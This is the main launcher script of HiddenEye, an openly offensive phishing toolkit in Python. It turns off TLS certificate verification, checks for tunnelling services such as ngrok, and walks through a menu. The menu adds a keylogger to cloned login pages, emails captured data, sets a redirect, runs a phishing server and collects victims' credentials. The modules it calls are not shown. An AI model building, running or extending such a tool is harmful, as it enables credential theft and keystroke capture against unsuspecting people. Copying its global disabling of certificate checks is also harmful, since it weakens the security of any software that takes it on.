#!/usr/bin/python3
#
# HiddenEye by https://dark-sec-official.com
#

from Defs.Checks import *
from os import system, environ
import Defs.ActionManager.main_runner as main_runner
import Defs.FeatureManager.keylogger as keylogger
import Defs.FeatureManager.cloudflare as cloudflare
import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
import Defs.ActionManager.Server.server_runner as server_runner
import Defs.ActionManager.Server.server_menu as server_menu
import Defs.ActionManager.simple_informant as simple_informant
import multiprocessing
import sys
import ssl


if(not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context


checkPermissions()
checkConnection()
verCheck()
checkPHP()
checkLocalxpose()
checkNgrok()
checkOpenport()
checkPagekite()
checkLT()

if __name__ == "__main__":
    try:
        main_runner.start_main_menu()
        keylogger.add_keylogger_prompt()
        cloudflare.add_cloudflare_prompt()
        email_prompt.captured_data_email_prompt()
        main_runner.enter_custom_redirecting_url()
        port = simple_informant.port_selector()

        ##############
        server_runner.start_server(port)
        server_menu.server_selection(port)
        

        multiprocessing.Process(target=server_runner.start_server, args=(port,)).start()
        simple_informant.credentials_collector(port)

    except KeyboardInterrupt:
        port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
        simple_informant.exit_message(port)
        exit()
